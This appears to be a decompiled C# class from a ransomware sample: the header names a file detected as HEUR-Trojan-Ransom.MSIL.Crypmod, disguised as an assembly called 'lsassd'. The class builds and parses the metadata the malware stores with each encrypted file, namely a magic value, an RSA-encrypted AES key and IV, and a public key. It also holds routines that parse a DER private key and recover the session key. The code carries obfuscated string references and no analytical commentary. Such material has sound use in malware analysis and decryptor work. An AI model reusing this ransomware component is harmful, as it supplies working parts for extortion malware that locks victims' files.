// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.EncryptionMetadata
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Cryptography;

namespace MOISHE.Core
{
  public class EncryptionMetadata
  {
    private static byte[] A = new byte[8]
    {
      (byte) 222,
      (byte) 254,
      (byte) 120,
      (byte) 252,
      (byte) 138,
      (byte) 126,
      (byte) 234,
      (byte) 249
    };
    public const int METADATA_VERSION = 1;

    public byte[] MagicValue => EncryptionMetadata.A;

    public byte[] EncryptedKey { get; set; }

    public byte[] EncryptedIV { get; set; }

    public byte[] PublicKey { get; set; }

    public int EncryptedKeySize
    {
      get
      {
        byte[] encryptedKey = this.EncryptedKey;
        return encryptedKey == null ? 0 : encryptedKey.Length;
      }
    }

    public int EncryptedIvSize
    {
      get
      {
        byte[] encryptedIv = this.EncryptedIV;
        return encryptedIv == null ? 0 : encryptedIv.Length;
      }
    }

    public int PublicKeySize
    {
      get
      {
        byte[] publicKey = this.PublicKey;
        return publicKey == null ? 0 : publicKey.Length;
      }
    }

    public int Limit { get; set; }

    public int Version => 1;

    public int BufferSize => EncryptionMetadata.A.Length + 20 + this.EncryptedKeySize + this.EncryptedIvSize + this.PublicKeySize;

    public byte[] Serialized()
    {
      if (this.EncryptedKeySize == 0 || this.EncryptedIvSize == 0 || this.PublicKeySize == 0)
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.al());
      if (this.EncryptedIvSize != this.EncryptedKeySize)
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aM());
      if (this.PublicKeySize < 256)
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.am());
      byte[] destinationArray = new byte[EncryptionMetadata.A.Length + 20 + this.EncryptedKeySize + this.EncryptedIvSize + this.PublicKeySize];
      int destinationIndex1 = 0;
      Array.Copy((Array) EncryptionMetadata.A, 0, (Array) destinationArray, destinationIndex1, EncryptionMetadata.A.Length);
      int num1 = destinationIndex1 + EncryptionMetadata.A.Length;
      int num2 = this.A(1, destinationArray, num1);
      int num3 = this.A(this.Limit, destinationArray, num2);
      int num4 = this.A(this.EncryptedIvSize, destinationArray, num3);
      int num5 = this.A(this.EncryptedKeySize, destinationArray, num4);
      int destinationIndex2 = this.A(this.PublicKeySize, destinationArray, num5);
      Array.Copy((Array) this.EncryptedIV, 0, (Array) destinationArray, destinationIndex2, this.EncryptedIvSize);
      int destinationIndex3 = destinationIndex2 + this.EncryptedIvSize;
      Array.Copy((Array) this.EncryptedKey, 0, (Array) destinationArray, destinationIndex3, this.EncryptedKeySize);
      int destinationIndex4 = destinationIndex3 + this.EncryptedKeySize;
      Array.Copy((Array) this.PublicKey, 0, (Array) destinationArray, destinationIndex4, this.PublicKeySize);
      return destinationArray;
    }

    private int A([In] int obj0, [In] byte[] obj1, [In] int obj2)
    {
      byte[] bytes = BitConverter.GetBytes(obj0);
      int length = bytes.Length;
      Array.Copy((Array) bytes, 0, (Array) obj1, obj2, bytes.Length);
      return obj2 + length;
    }

    public static EncryptionMetadata Deserialize(byte[] buffer)
    {
      int length1 = EncryptionMetadata.A.Length + 20;
      if (buffer == null)
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aN());
      if (buffer.Length <= length1)
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.an());
      byte[] destinationArray1 = new byte[length1];
      Array.Copy((Array) buffer, (Array) destinationArray1, length1);
      if (!EncryptionMetadata.IsContainsMagic(buffer, 0))
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aO());
      int length2 = EncryptionMetadata.A.Length;
      if (!EncryptionMetadata.IsVersionMatched(buffer, length2))
        throw new SerializationException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ao());
      int startIndex = length2 + 4;
      int int32 = BitConverter.ToInt32(buffer, startIndex);
      int num1 = startIndex + 4;
      int length3 = EncryptionMetadata.A(buffer, num1);
      int num2 = num1 + 4;
      int length4 = EncryptionMetadata.A(buffer, num2);
      int num3 = num2 + 4;
      int length5 = EncryptionMetadata.A(buffer, num3);
      int sourceIndex1 = num3 + 4;
      int num4 = length3 + length4 + length5;
      byte[] destinationArray2 = new byte[length3];
      byte[] destinationArray3 = new byte[length4];
      byte[] destinationArray4 = new byte[length5];
      Array.Copy((Array) buffer, sourceIndex1, (Array) destinationArray2, 0, length3);
      int sourceIndex2 = sourceIndex1 + length3;
      Array.Copy((Array) buffer, sourceIndex2, (Array) destinationArray3, 0, length4);
      int sourceIndex3 = sourceIndex2 + length4;
      Array.Copy((Array) buffer, sourceIndex3, (Array) destinationArray4, 0, length5);
      return new EncryptionMetadata()
      {
        EncryptedKey = destinationArray3,
        EncryptedIV = destinationArray2,
        PublicKey = destinationArray4,
        Limit = int32
      };
    }

    public static bool IsContainsMagic(byte[] buffer, int offset)
    {
      for (int index = 0; index < EncryptionMetadata.A.Length; ++index)
      {
        if ((int) buffer[offset + index] != (int) EncryptionMetadata.A[index])
          return false;
      }
      return true;
    }

    public static bool IsVersionMatched(byte[] buffer, int offset) => BitConverter.ToInt32(buffer, offset) == 1;

    private static int A([In] byte[] obj0, [In] int obj1) => BitConverter.ToInt32(obj0, obj1);

    public Session DecryptSession(byte[] PrivateKeyBuffer, int offset, int length)
    {
      byte[] numArray = new byte[length];
      Array.Copy((Array) PrivateKeyBuffer, offset, (Array) numArray, 0, length);
      RSAParameters rsaParameters = EncryptionMetadata.ImportPrivateKey(numArray);
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      cryptoServiceProvider.ImportParameters(rsaParameters);
      return new Session(rsaParameters)
      {
        IV = cryptoServiceProvider.Decrypt(this.EncryptedIV, false),
        DEK = cryptoServiceProvider.Decrypt(this.EncryptedKey, false)
      };
    }

    public bool IsPrivateKeyMatched(byte[] PrivateKeyBuffer, int offset, int length)
    {
      byte[] numArray = new byte[length];
      Array.Copy((Array) PrivateKeyBuffer, offset, (Array) numArray, 0, length);
      RSAParameters rsaParameters1 = EncryptionMetadata.ImportPrivateKey(numArray);
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      RSAParameters rsaParameters2 = KeyGenerator.ImportPublicKey(this.PublicKey);
      IStructuralEquatable exponent1 = (IStructuralEquatable) rsaParameters2.Exponent;
      IStructuralEquatable exponent2 = (IStructuralEquatable) rsaParameters1.Exponent;
      IStructuralEquatable modulus1 = (IStructuralEquatable) rsaParameters2.Modulus;
      IStructuralEquatable modulus2 = (IStructuralEquatable) rsaParameters1.Modulus;
      return exponent1.Equals((object) exponent2, StructuralComparisons.StructuralEqualityComparer) & modulus1.Equals((object) modulus2, StructuralComparisons.StructuralEqualityComparer);
    }

    public static RSAParameters ImportPrivateKey(byte[] der)
    {
      BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(der));
      try
      {
        switch (binaryReader.ReadUInt16())
        {
          case 33072:
            int num1 = (int) binaryReader.ReadByte();
            break;
          case 33328:
            int num2 = (int) binaryReader.ReadInt16();
            break;
          default:
            throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aP());
        }
        if (binaryReader.ReadUInt16() != (ushort) 258)
          throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aP());
        int count1 = binaryReader.ReadByte() == (byte) 0 ? EncryptionMetadata.A(binaryReader) : throw new CryptographicException(\u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aP());
        byte[] numArray1 = binaryReader.ReadBytes(count1);
        int count2 = EncryptionMetadata.A(binaryReader);
        byte[] numArray2 = binaryReader.ReadBytes(count2);
        int count3 = EncryptionMetadata.A(binaryReader);
        byte[] numArray3 = binaryReader.ReadBytes(count3);
        int count4 = EncryptionMetadata.A(binaryReader);
        byte[] numArray4 = binaryReader.ReadBytes(count4);
        int count5 = EncryptionMetadata.A(binaryReader);
        byte[] numArray5 = binaryReader.ReadBytes(count5);
        int count6 = EncryptionMetadata.A(binaryReader);
        byte[] numArray6 = binaryReader.ReadBytes(count6);
        int count7 = EncryptionMetadata.A(binaryReader);
        byte[] numArray7 = binaryReader.ReadBytes(count7);
        int count8 = EncryptionMetadata.A(binaryReader);
        byte[] numArray8 = binaryReader.ReadBytes(count8);
        return new RSAParameters()
        {
          Modulus = numArray1,
          Exponent = numArray2,
          D = numArray3,
          P = numArray4,
          Q = numArray5,
          DP = numArray6,
          DQ = numArray7,
          InverseQ = numArray8
        };
      }
      finally
      {
        binaryReader.Close();
      }
    }

    private static int A([In] BinaryReader obj0)
    {
      if (obj0.ReadByte() != (byte) 2)
        return 0;
      byte num1 = obj0.ReadByte();
      int num2;
      switch (num1)
      {
        case 129:
          num2 = (int) obj0.ReadByte();
          break;
        case 130:
          byte num3 = obj0.ReadByte();
          num2 = BitConverter.ToInt32(new byte[4]
          {
            obj0.ReadByte(),
            num3,
            (byte) 0,
            (byte) 0
          }, 0);
          break;
        default:
          num2 = (int) num1;
          break;
      }
      while (obj0.ReadByte() == (byte) 0)
        --num2;
      obj0.BaseStream.Seek(-1L, SeekOrigin.Current);
      return num2;
    }
  }
}
